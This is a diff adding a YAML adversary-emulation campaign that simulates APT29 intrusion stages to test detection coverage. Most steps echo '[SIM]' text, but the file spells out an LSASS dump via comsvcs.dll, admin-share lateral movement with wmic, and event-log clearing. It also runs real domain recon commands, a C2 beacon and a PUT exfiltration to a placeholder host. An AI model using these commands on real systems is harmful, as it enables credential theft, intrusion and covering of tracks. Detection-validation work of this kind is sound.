@@ -1,0 +1,196 @@
+api_version: v1
+kind: Campaign
+
+meta:
+  name: apt29-cozy-bear
+  adversary: APT29
+  description: "APT29 (Cozy Bear) full-spectrum intrusion — from spearphishing to data exfiltration"
+  objective: "Simulate APT29 TTPs across the complete kill chain to validate detection coverage"
+  mitre_version: "15.1"
+  severity: critical
+  tags: [apt, nation-state, russia, espionage, cozy-bear]
+  authors: ["ThreatEcho"]
+  references:
+    - https://attack.mitre.org/groups/G0016/
+    - https://github.com/center-for-threat-informed-defense/adversary_emulation_library/tree/master/apt29
+  created: "2026-09-14"
+  modified: "2026-09-14"
+
+variables:
+  c2_server: "192.168.1.100"
+  c2_port: "443"
+  target_domain: "corp.local"
+  exfil_endpoint: "https://storage.example.com/upload"
+
+stages:
+  - id: initial-access
+    name: Spearphishing Attachment
+    description: "Deliver macro-enabled document to establish initial foothold"
+    technique: T1566.001
+    tactic: initial-access
+    platform: [windows]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] User opens macro-enabled document → dropper executes"'
+        - 'echo "[SIM] Payload written to %TEMP%\update.exe"'
+      cleanup:
+        - 'echo "[SIM] Removing dropped payload"'
+    expect:
+      telemetry: [process_create, file_write]
+      detections: [spearphishing_attachment_execution, suspicious_office_child_process]
+      artifacts: ["%TEMP%\\update.exe"]
+    on_success: command-and-control
+    on_failure: abort
+    timeout: 60s
+
+  - id: command-and-control
+    name: HTTPS C2 Beacon
+    description: "Establish encrypted C2 channel over HTTPS"
+    technique: T1071.001
+    tactic: command-and-control
+    platform: [windows, linux]
+    depends_on: [initial-access]
+    execute:
+      type: http
+      target: "{{c2_server}}"
+      args:
+        port: "{{c2_port}}"
+        protocol: https
+        interval: "30s"
+        jitter: "20%"
+    expect:
+      telemetry: [network_connection, dns_query]
+      detections: [periodic_beacon_pattern, suspicious_tls_connection]
+      iocs: ["{{c2_server}}"]
+    on_success: discovery
+    on_failure: abort
+    timeout: 120s
+
+  - id: discovery
+    name: Domain Reconnaissance
+    description: "Enumerate domain accounts, groups, and trust relationships"
+    technique: T1087.002
+    tactic: discovery
+    platform: [windows]
+    depends_on: [command-and-control]
+    execute:
+      type: shell
+      commands:
+        - 'whoami /all'
+        - 'net group "Domain Admins" /domain'
+        - 'nltest /dclist:{{target_domain}}'
+        - 'net group "Enterprise Admins" /domain'
+      elevated: false
+    expect:
+      telemetry: [process_create]
+      detections: [suspicious_ad_enumeration, recon_command_sequence]
+    on_success: credential-access
+    on_failure: continue
+
+  - id: credential-access
+    name: LSASS Memory Dump
+    description: "Dump credentials from LSASS process memory"
+    technique: T1003.001
+    tactic: credential-access
+    platform: [windows]
+    depends_on: [discovery]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass_pid> dump.bin full"'
+      elevated: true
+      cleanup:
+        - 'echo "[SIM] Removing memory dump"'
+    expect:
+      telemetry: [process_create, process_access, file_write]
+      detections: [lsass_memory_access, credential_dumping_via_comsvcs]
+      artifacts: ["dump.bin"]
+    on_success: lateral-movement
+    on_failure: continue
+    timeout: 30s
+
+  - id: lateral-movement
+    name: SMB Lateral Movement
+    description: "Move laterally to domain controller via admin shares"
+    technique: T1021.002
+    tactic: lateral-movement
+    platform: [windows]
+    depends_on: [credential-access]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] net use \\\\DC01\\C$ /user:{{target_domain}}\\admin <password>"'
+        - 'echo "[SIM] copy payload.exe \\\\DC01\\C$\\Windows\\Temp\\"'
+        - 'echo "[SIM] wmic /node:DC01 process call create C:\\Windows\\Temp\\payload.exe"'
+      elevated: true
+      cleanup:
+        - 'echo "[SIM] Removing payload from remote host"'
+        - 'echo "[SIM] Disconnecting admin share"'
+    expect:
+      telemetry: [network_connection, authentication, process_create, file_write]
+      detections: [smb_admin_share_access, remote_process_creation, lateral_movement_via_wmic]
+      iocs: ["DC01"]
+    on_success: collection
+    on_failure: abort
+    timeout: 60s
+
+  - id: collection
+    name: Data Staging
+    description: "Collect and stage sensitive documents for exfiltration"
+    technique: T1074.001
+    tactic: collection
+    platform: [windows]
+    depends_on: [lateral-movement]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] dir /s /b \\\\DC01\\C$\\Users\\*.docx *.xlsx *.pdf > filelist.txt"'
+        - 'echo "[SIM] Staging 47 documents to C:\\Windows\\Temp\\stage\\"'
+    expect:
+      telemetry: [file_read, file_write]
+      detections: [mass_file_access, data_staging_in_temp]
+      artifacts: ["C:\\Windows\\Temp\\stage\\"]
+    on_success: defense-evasion
+    on_failure: continue
+
+  - id: defense-evasion
+    name: Indicator Removal
+    description: "Clear event logs and remove forensic artifacts"
+    technique: T1070.004
+    tactic: defense-evasion
+    platform: [windows]
+    depends_on: [collection]
+    execute:
+      type: shell
+      commands:
+        - 'echo "[SIM] wevtutil cl Security"'
+        - 'echo "[SIM] wevtutil cl System"'
+        - 'echo "[SIM] del /f /q C:\\Windows\\Temp\\stage\\*.tmp"'
+      elevated: true
+    expect:
+      telemetry: [process_create, log_clear]
+      detections: [security_log_cleared, event_log_manipulation]
+    on_success: exfiltration
+    on_failure: continue
+
+  - id: exfiltration
+    name: Exfiltration to Cloud Storage
+    description: "Exfiltrate staged data to attacker-controlled cloud storage"
+    technique: T1567.002
+    tactic: exfiltration
+    platform: [windows, linux]
+    depends_on: [defense-evasion]
+    execute:
+      type: http
+      target: "{{exfil_endpoint}}"
+      args:
+        method: PUT
+        data_source: "C:\\Windows\\Temp\\stage\\"
+        encrypt: "aes-256"
+    expect:
+      telemetry: [network_connection, dns_query, file_read]
+      detections: [large_outbound_transfer, exfiltration_to_cloud, unusual_upload_volume]
+      iocs: ["{{exfil_endpoint}}"]
+    on_failure: abort
+    timeout: 300s
